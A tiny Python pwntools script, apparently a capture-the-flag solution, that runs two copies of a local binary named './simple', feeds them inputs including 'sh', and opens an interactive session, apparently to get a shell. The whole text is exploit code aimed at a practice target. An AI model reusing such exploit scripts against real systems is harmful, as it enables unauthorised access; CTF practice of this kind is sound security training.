from pwn import *

r1 = process('./simple')
r2 = process('./simple')

r1.sendline('lalala')
r2.sendline('sh')
r2.close()

r1.sendline('y')

r1.interactive()